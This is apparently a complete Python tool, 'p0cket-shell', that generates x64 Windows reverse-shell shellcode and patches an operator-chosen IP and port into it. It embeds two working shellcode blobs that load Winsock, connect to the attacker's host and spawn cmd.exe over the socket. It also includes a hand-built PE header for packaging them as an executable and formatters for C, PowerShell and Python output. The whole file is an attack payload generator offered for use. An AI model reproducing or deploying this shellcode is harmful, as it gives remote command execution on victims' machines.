import dataclasses
import argparse

#             ____       __        __             __         ____
#      ____  / __ \_____/ /_____  / /_      _____/ /_  ___  / / /
#     / __ \/ / / / ___/ //_/ _ \/ __/_____/ ___/ __ \/ _ \/ / / 
#    / /_/ / /_/ / /__/ ,< /  __/ /_/_____(__  ) / / /  __/ / /  
#   / .___/\____/\___/_/|_|\___/\__/     /____/_/ /_/\___/_/_/   
#  /_/
#  Author: SilentisVox
#  Github: https://github.com/SilentisVox/p0cket-shell

@dataclasses.dataclass
class Offsets:
    address                             : tuple
    code                                : tuple = None
    file                                : tuple = None

@dataclasses.dataclass
class Address:
    LHOST                               : str
    LPORT                               : str

@dataclasses.dataclass
class Payload:
    offsets                             : Offsets
    payload                             : bytes
    exe_header                          : bytes = None

class p0cket_shell:
    def __init__(self, payload: Payload, address: Address, f: str="python", file: str=None) -> None:
        self.payload                    = payload
        self.address                    = address
        self.format                     = f
        self.format_functions           = {
            "c"                         : self.c,
            "powershell"                : self.powershell,
            "ps1"                       : self.powershell,
            "py"                        : self.python,
            "python"                    : self.python,
            "raw"                       : self.raw,
            "exe"                       : self.exe
        }
        self.file                       = file

    def generate(self) -> None:
        lhost                           = self.address.LHOST
        lport                           = self.address.LPORT
        address                         = self.convert_address(lhost, lport)
        address_offset                  = self.payload.offsets.address
        payload                         = bytearray(self.payload.payload)
        payload[address_offset[0]:address_offset[0] + address_offset[1]] = address
        payload_length                  = len(payload)
        print("[*] Payload size: {} bytes".format(payload_length))
        formatted_payload               = self.format_functions[self.format](payload)
        final_payload_length            = len(formatted_payload)
        print("[*] Final size of {} file: {} bytes".format(self.format, final_payload_length))
        self.output(formatted_payload)

    def convert_address(self, lhost: str, lport: str) -> bytes:
        address                         = bytearray()
        port_int                        = int(lport)
        port_bytes                      = port_int.to_bytes(2)
        address.extend(port_bytes)
        ip_octets                       = lhost.split(".")

        for octet in ip_octets:
            octet_int                   = int(octet)
            address.append(octet_int)

        address_bytes                   = bytes(address)
        return address_bytes

    def c(self, payload: bytes) -> str:
        output                          = ""
        output                         += "unsigned char buf[] = {\n"
        formatted_bytes                 = []

        for byte_index in range(0, len(payload), 12):
            byte_chunk                  = payload[byte_index : byte_index + 12]
            formatted_byte_row          = [f"0x{byte:02x}" for byte in byte_chunk]
            hex_bytes                   = ", ".join(formatted_byte_row)
            formatted_bytes.append(hex_bytes)

        output                         += "    "
        output                         += ",\n    ".join(formatted_bytes)
        output                         += "\n}"
        
        return output

    def powershell(self, payload: bytes) -> str:
        output                          = ""
        output                         += "[byte[]] $buf = @(\n"
        formatted_bytes                 = []

        for byte_index in range(0, len(payload), 12):
            byte_chunk                  = payload[byte_index : byte_index + 12]
            formatted_byte_row          = [f"0x{byte:02x}" for byte in byte_chunk]
            hex_bytes                   = ", ".join(formatted_byte_row)
            formatted_bytes.append(hex_bytes)

        output                         += "    "
        output                         += ",\n    ".join(formatted_bytes)
        output                         += "\n)"

        return output

    def python(self, payload: bytes) -> str:
        output                          = ""
        output                         += 'buf  = b""\n'
        formatted_bytes                 = []

        for byte_index in range(0, len(payload), 12):
            byte_chunk                  = payload[byte_index : byte_index + 12]
            formatted_byte_row          = [f"\\x{byte:02x}" for byte in byte_chunk]
            hex_bytes                   = 'buf += b"' + "".join(formatted_byte_row) + '"\n'
            formatted_bytes.append(hex_bytes)

        output                         += "".join(formatted_bytes)

        return output

    def raw(self, payload):
        payload                         = bytes(payload)
        return payload

    def exe(self, payload: bytes) -> None:
        code_offset                     = self.payload.offsets.code
        code_size                       = len(payload)
        code_bytes                      = code_size.to_bytes(4, "little")
        exe_header                      = bytearray(self.payload.exe_header)
        exe_header[code_offset[0]:code_offset[0] + code_offset[1]] = code_bytes
        exe                             = exe_header + payload
        file_offset                     = self.payload.offsets.file
        file_size                       = len(exe)
        file_bytes                      = file_size.to_bytes(4, "little")
        exe[file_offset[0]:file_offset[0] + file_offset[1]] = file_bytes
        exe                             = bytes(exe)

        return exe

    def output(self, output_object) -> None:
        if not self.file:
            print(output_object)
            return

        if isinstance(output_object, str):
            write_method                = "w"

        if isinstance(output_object, bytes):
            write_method                = "wb"

        with open(self.file, write_method) as file_buffer:
            file_buffer.write(output_object)

resolve: bytes                          = (
    b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40\x18\x48\x8b\x40"
    b"\x30\x48\x8b\x00\x48\x8b\x00\x48\x8b\x68\x10\x49\x89\xe9\x41\xba"
    b"\xc9\xbc\xa6\x6b\xe8\x5a\x00\x00\x00\x49\x89\xc7\x41\xba\x32\x74"
    b"\x91\x0c\xe8\x4c\x00\x00\x00\x49\x89\xc6\x68\x6c\x6c\x00\x00\x48"
    b"\xb8\x77\x73\x32\x5f\x33\x32\x2e\x64\x50\x48\x89\xe1\x48\x83\xec"
    b"\x28\x41\xff\xd6\x49\x89\xc1\x41\xba\x3d\x6a\xb4\x80\xe8\x21\x00"
    b"\x00\x00\x49\x89\xc6\x41\xba\x2d\x32\x78\xde\xe8\x13\x00\x00\x00"
    b"\x49\x89\xc5\x41\xba\x10\x4b\x78\xb8\xe8\x05\x00\x00\x00\x49\x89"
    b"\xc4\xeb\x58\x41\x8b\x51\x3c\x49\x8d\x14\x11\x8b\x92\x88\x00\x00"
    b"\x00\x49\x8d\x14\x11\x8b\x4a\x18\x8b\x7a\x20\x49\x8d\x3c\x39\x48"
    b"\xff\xc9\x8b\x34\x8f\x49\x8d\x34\x31\x48\x31\xc0\x48\x31\xdb\xfc"
    b"\xac\x84\xc0\x74\x07\xc1\xcb\x07\x01\xc3\xeb\xf4\x44\x39\xd3\x75"
    b"\xde\x8b\x42\x24\x49\x8d\x04\x01\x0f\xb7\x0c\x48\x8b\x42\x1c\x49"
    b"\x8d\x04\x01\x8b\x04\x88\x49\x8d\x04\x01\xc3\x48\x31\xc9\x48\x81"
    b"\xec\xf0\x01\x00\x00\x48\x8d\x54\x24\x30\x66\xb9\x02\x02\x41\xff"
    b"\xd6\x48\x31\xc9\xb1\x02\x48\x31\xd2\xb2\x01\x4d\x31\xc0\x41\xb0"
    b"\x06\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\x41\xff"
    b"\xd5\x49\x89\xc6\x4c\x89\xf1\x48\xba\x02\x00\x00\x00\x00\x00\x00"
    b"\x00\x48\x89\x14\x24\x48\x8d\x14\x24\x4d\x31\xc0\x41\xb0\x16\x48"
    b"\x83\xec\x38\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\x4c\x89\x4c"
    b"\x24\x30\x41\xff\xd4\x48\x83\xc4\x38\x48\xb8\x63\x6d\x64\x2e\x65"
    b"\x78\x65\x00\x50\x48\x89\xe2\x41\x56\x41\x56\x41\x56\x48\x31\xc9"
    b"\x66\x51\x51\x51\x66\xb9\x00\x01\x66\x51\x48\x31\xc9\x66\x51\x66"
    b"\x51\x51\x51\x51\x51\x51\x51\x6a\x68\x48\x89\xe7\x48\x8d\x4c\x24"
    b"\xe0\x51\x57\x48\x31\xc9\x51\x51\x68\x00\x00\x00\x08\x6a\x01\x51"
    b"\x51\x51\x51\x49\x89\xc8\x41\xff\xd7"
)
hardcode: bytes                         = (
    b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40\x18\x48\x8b\x40"
    b"\x30\x48\x8b\x00\x48\x8b\x00\x48\x8b\x68\x10\x4c\x8d\xbd\x70\x4f"
    b"\x04\x00\x4c\x8d\xb5\x80\x2d\x04\x00\x68\x6c\x6c\x00\x00\x48\xb8"
    b"\x77\x73\x32\x5f\x33\x32\x2e\x64\x50\x48\x89\xe1\x48\x83\xec\x28"
    b"\x41\xff\xd6\x4c\x8d\xb0\xe0\x26\x00\x00\x4c\x8d\xa8\x40\xba\x02"
    b"\x00\x4c\x8d\xa0\x00\x4a\x00\x00\x48\x31\xc9\x48\x81\xec\xf0\x01"
    b"\x00\x00\x48\x8d\x54\x24\x30\x66\xb9\x02\x02\x41\xff\xd6\x48\x31"
    b"\xc9\xb1\x02\x48\x31\xd2\xb2\x01\x4d\x31\xc0\x41\xb0\x06\x4d\x31"
    b"\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\x41\xff\xd5\x49\x89"
    b"\xc6\x4c\x89\xf1\x48\xba\x02\x00\x00\x00\x00\x00\x00\x00\x48\x89"
    b"\x14\x24\x48\x8d\x14\x24\x4d\x31\xc0\x41\xb0\x16\x48\x83\xec\x38"
    b"\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\x4c\x89\x4c\x24\x30\x41"
    b"\xff\xd4\x48\x83\xc4\x38\x48\xb8\x63\x6d\x64\x2e\x65\x78\x65\x00"
    b"\x50\x48\x89\xe2\x41\x56\x41\x56\x41\x56\x48\x31\xc9\x66\x51\x51"
    b"\x51\x66\xb9\x00\x01\x66\x51\x48\x31\xc9\x66\x51\x66\x51\x51\x51"
    b"\x51\x51\x51\x51\x6a\x68\x48\x89\xe7\x48\x8d\x4c\x24\xe0\x51\x57"
    b"\x48\x31\xc9\x51\x51\x68\x00\x00\x00\x08\x6a\x01\x51\x51\x51\x51"
    b"\x49\x89\xc8\x41\xff\xd7"
)
exe_header: bytes                       = (
    b"\x4d\x5a\x00\x00\x50\x45\x00\x00\x64\x86\x00\x00\x73\x69\x6c\x65"
    b"\x6e\x74\x69\x73\x00\x00\x00\x00\x80\x00\x22\x00\x0b\x02\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9c\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x40\x01\x00\x00\x00\x04\x00\x00\x00"
    b"\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x8b\x00\x00\x00\x00\x00\x00\x00"
    b"\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
)

def main():

    banner                              = r"""
            ____       __        __             __         ____
     ____  / __ \_____/ /_____  / /_      _____/ /_  ___  / / /
    / __ \/ / / / ___/ //_/ _ \/ __/_____/ ___/ __ \/ _ \/ / / 
   / /_/ / /_/ / /__/ ,< /  __/ /_/_____(__  ) / / /  __/ / /  
  / .___/\____/\___/_/|_|\___/\__/     /____/_/ /_/\___/_/_/   
 /_/
 Author: SilentisVox
 Github: https://github.com/SilentisVox/p0cket-shell
"""

    print(banner)
    parser = argparse.ArgumentParser(description="Smallest Reverse Shell Shellcode Generator.")

    parser.add_argument("--payload", "-p", required=True, default="hardcode", choices=["hardcode", "resolve"], help="Payload type.")
    parser.add_argument("--LHOST", "-lh", required=True, help="Local host IP address.")
    parser.add_argument("--LPORT", "-lp", required=True, help="Local port number.")
    parser.add_argument("--format", "-f", required=True, default="python",   choices=["c", "powershell", "ps1", "python", "exe", "raw"], help="Output format.")
    parser.add_argument("--output", "-o", help="Optional output file path.")

    args = parser.parse_args()

    if args.payload == "hardcode":
        payload                         = hardcode
        payload_offset                  = (152, 6)

    if args.payload == "resolve":
        payload                         = resolve
        payload_offset                  = (283, 6)

    address                             = Address(args.LHOST, args.LPORT)
    offsets                             = Offsets(payload_offset, (32, 4), (84, 4))
    full_package                        = Payload(offsets, payload, exe_header)
    pocket_shell                        = p0cket_shell(full_package, address, args.format, args.output)

    pocket_shell.generate()

if __name__ == "__main__":
    main()